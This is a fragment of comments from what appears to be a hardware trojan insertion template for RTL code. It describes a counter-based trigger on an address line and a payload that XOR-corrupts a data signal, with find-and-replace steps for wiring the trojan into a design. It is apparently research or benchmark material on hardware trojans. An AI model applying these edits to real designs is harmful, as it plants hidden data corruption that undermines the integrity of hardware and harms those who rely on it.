 ...
 *   
 * Trigger: Counter on address_i
 * Payload: Corrupt data_i with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt data_i with XOR
//
// Integration Script Must Modify:
//
// IF data_i is assigned:
//   Find: assign data_i = data_value;
//   Replace: assign data_i = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF data_i is in always_ff:
//   Find: data_i <= data_value;
//   Replace: data_i <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
